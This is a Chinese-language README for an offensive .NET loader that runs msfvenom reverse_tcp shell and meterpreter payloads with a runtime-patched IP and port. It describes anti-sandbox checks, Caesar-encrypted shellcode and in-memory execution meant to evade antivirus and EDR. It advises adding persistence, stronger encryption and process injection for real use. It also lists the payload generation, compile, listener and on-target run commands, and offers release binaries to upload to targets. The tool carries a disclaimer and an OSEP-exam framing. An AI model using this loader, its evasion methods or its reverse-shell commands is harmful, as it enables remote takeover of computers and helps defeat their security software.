# RevShell-Swap
RevSwap 是一个轻量级 .NET 动态加载器，通过加密与特征码定位实现 reverse_tcp shellcode 的 IP/端口免编译替换，并内置反沙箱检测，适用于 OSEP 等渗透测试环境。
## ⚠️免责声明

**本工具仅供安全研究与授权测试使用。使用者须遵守所在国法律法规，并确保已获得被测系统所有者的明确授权。严禁将此工具用于任何非法攻击、入侵或破坏他人计算机系统的活动。若使用者违反前述规定，产生的一切法律责任与后果由使用者自行承担，与本项目及开发者无关。**

## 解决的问题

每次生成 `reverse_tcp` 载荷时，都需要在 Kali 上重新运行 `msfvenom`，再将输出的 shellcode 拷贝到 C# 工程中，最后重新编译整个可执行文件。当需要频繁更换 C2 IP 地址或测试不同端口时，这一过程极其低效。本项目通过 **动态替换 IP 和端口** 的方式，将载荷变为 “模板化”：

- 生成一次性 **占位符载荷**（IP \= `17.17.17.17`，Port \= `8738`）并静态嵌入程序。
- 运行时从命令行接收真实的 IP 和 Port，解密后直接修改 shellcode 中的 `sockaddr_in` 结构体。
- 无需重新生成 shellcode，也无需重新编译，一个 EXE 即可反复使用。

---

## 绕过手法

本加载器主要采用以下技术来规避部分杀毒软件 / EDR：

- **反沙箱 - 睡眠加速检测**
  程序先 `Sleep(5000)`，再检查实际流逝时间。若时间被大幅缩短（\< 4.5 秒），说明可能在沙箱中被 “加速” 运行，立即退出。
- **反沙箱 - NUMA 内存分配**
  通过 `VirtualAllocExNuma` 尝试分配内存，许多沙箱/虚拟机因无真实的 NUMA 拓扑而直接返回失败，从而提前终止运行。
- **凯撒加密静态载荷**
  嵌入的 shellcode 使用简单的凯撒移位（+5）加密，避免原样出现在二进制文件中，绕过部分静态特征检测。
- **内存执行**
  shellcode 解密后直接放入 `VirtualAlloc` 分配的可执行内存中，并通过 `CreateThread` 启动，全程不落地文件。

---

## 不足之处

- 这些手法 **不足以绕过现代主流杀毒软件**（如 Windows Defender、Kaspersky、CrowdStrike 等），尤其是在开启云端主动防御、行为分析的环境中。
- 凯撒加密属于极弱加密，仅能规避最原始的字符串特征匹配。若要将此工具用于实战，强烈建议替换为 AES、ChaCha20 等强加密，并结合 **进程镂空（Process Hollowing）** 、**APC 注入** 或 **回调执行** 等高级内存执行技术。
- 在 OSEP 等渗透测试认证考试场景中，本工具仍有其适用价值，但必须结合其他绕过与执行链来达到预期效果。

---

## 思路与扩展

本项目的主要目的是提供一个 **灵活、可二次开发的轮子**。你可以基于现有代码进行以下扩展：

- **更换加密算法**：将凯撒替换为 AES、XOR 或 RC4，并动态生成 IV/Key。
- **更换执行方式**：在解密后不直接 `CreateThread`，而是通过进程镂空、QueueUserAPC、Fibers 等方式注入到远程进程。
- **增加更多载荷类型**：当前仅支持 `reverse_tcp`（x86/x64, shell/meterpreter），可扩展至 `bind_tcp`、`reverse_https`（需要额外处理字符串 IP）。
- **添加持久化**：在执行 shellcode 前，写入计划任务或注册表 Run 键。
- **混淆与压缩**：对 .NET 程序使用混淆器（ConfuserEx、Obfuscar）或打包为单文件 AOT 以提高静态免杀能力。

---

## 开发过程中遇到的主要坑

1. **x86 与 x64 sockaddr 结构差异**
   x64 的 sockaddr 是连续的 8 字节 `02 00 [port] [ip]`，而 x86 通过两条 `push` 指令分别压入 IP 和端口。替换时必须使用不同的偏移量，否则会导致后续指令被覆盖。
2. **端口字节序问题**
   端口在网络字节序中必须使用大端表示。最初直接使用 `BitConverter.GetBytes((ushort)port)` 得到的是小端序，在端口号不对称（如 4444 \= 0x115C）时会直接失败。最终全部改为手动大端写入。
3. **占位符唯一性**
   早期用全局搜索 `0x11,0x11,0x11,0x11` 或 `0x22,0x22` 替换，但某些版本的 shellcode 中这些字节可能多次出现。改用 `AF_INET (02 00) + 占位端口` 作为特征码进行上下文匹配，确保只替换 sockaddr 内的数据。
4. **加密数组长度与换行**
   从 `msfvenom` 输出的 C# 数组包含换行，直接复制到代码里容易引入语法错误。建议使用 Python 脚本一次性生成无换行的加密数组，并确保长度正确。
5. **编译平台匹配**
   x86 的载荷必须在编译时指定 `/platform:x86`，否则在 64 位系统上可能因指针长度、调用约定等问题导致崩溃。

---

## 程序代码

以下四个文件为本项目核心源码，分别对应四种载荷类型。请将你生成并凯撒加密后的 `enc` 数组替换到对应位置，再按照注释中的编译命令编译即可。

### 1. `met64_tcp.cs` - x64 Meterpreter TCP

### 2. `met_tcp.cs` - x86 Meterpreter TCP

### 3. `shell64_tcp.cs` - x64 Shell TCP

### 4. `shell_tcp.cs` - x86 Shell TCP

---

## 快速使用

### 自行编译

以windows/x64/meterpreter/reverse_tcp为例

1. 为每个程序生成占位符 shellcode 并凯撒 +5 加密，得到 `enc` 数组。

   ```csharp
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=17.17.17.17 LPORT=8738 -f csharp
   ```

   ![image](../image-20260610175842-f0ofkwg.png)

   ![image](../image-20260610175915-srrihsf.png)
2. 将数组替换到对应 `.cs` 文件的 `enc` 变量中。

   ![image](../image-20260610180009-oos7vfy.png)
3. 使用 Visual Studio 开发者命令提示符编译（注意平台）：

   ```
   csc /platform:x64 /out:met64_tcp.exe met64_tcp.cs
   ```
4. 在 Kali 上启动监听：

   ```csharp
   msfconsole
   use multi/handler
   set payload windows/64/meterpreter/reverse_tcp
   set lport xxxx
   set lhost xxx.xxx.xxx.xxx
   run
   ```
5. 在目标 Windows 上执行：

   ```csharp
   met64_tcp.exe <ip> <port>
   ```

   ![image](../image-20260610180411-p15jj01.png)

### 直接下载release使用

自行下载对应架构的exe上传到目标使用
